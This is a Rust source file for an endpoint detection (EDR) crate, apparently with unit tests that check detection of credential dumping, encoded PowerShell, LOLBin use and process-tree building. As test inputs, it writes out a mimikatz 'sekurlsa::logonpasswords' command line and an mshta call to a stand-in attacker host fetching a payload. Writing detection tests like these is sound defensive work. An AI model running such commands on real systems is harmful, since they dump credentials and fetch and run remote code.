pub mod detector;

pub use royalsecurity_core as core;
pub use royalsecurity_common as common;
pub use detector::*;

#[cfg(test)]
mod tests {
    use super::*;
    use royalsecurity_common::types::EventSeverity;

    #[test]
    fn test_edr_detector_new() {
        let detector = EdrDetector::new();
        assert_eq!(detector.process_count(), 0);
        assert_eq!(detector.alert_count(), 0);
    }

    #[test]
    fn test_credential_dumping_detection() {
        let mut detector = EdrDetector::new();
        let results = detector.analyze_process(100, 1, "mimikatz.exe", "C:\\temp\\mimikatz.exe", "sekurlsa::logonpasswords", "admin");
        assert!(!results.is_empty());
        assert_eq!(results[0].severity, EventSeverity::Critical);
        assert_eq!(results[0].mitre_technique, "T1003");
    }

    #[test]
    fn test_encoded_powershell_detection() {
        let mut detector = EdrDetector::new();
        let results = detector.analyze_process(200, 1, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell -enc SQBmACgA", "user");
        assert!(!results.is_empty());
        assert_eq!(results[0].severity, EventSeverity::High);
    }

    #[test]
    fn test_lolbin_detection() {
        let mut detector = EdrDetector::new();
        let results = detector.analyze_process(300, 1, "mshta.exe", "C:\\Windows\\System32\\mshta.exe", "http://evil.com/payload.hta", "user");
        assert!(!results.is_empty());
        assert_eq!(results[0].rule_name, "LOLBin Execution");
    }

    #[test]
    fn test_process_tree_building() {
        let mut detector = EdrDetector::new();
        detector.analyze_process(1, 0, "systemd", "/usr/sbin/systemd", "", "root");
        detector.analyze_process(100, 1, "sshd", "/usr/sbin/sshd", "", "root");
        detector.analyze_process(200, 100, "bash", "/bin/bash", "", "user");

        let tree = detector.build_process_tree(1);
        assert!(tree.len() >= 2);
    }
}
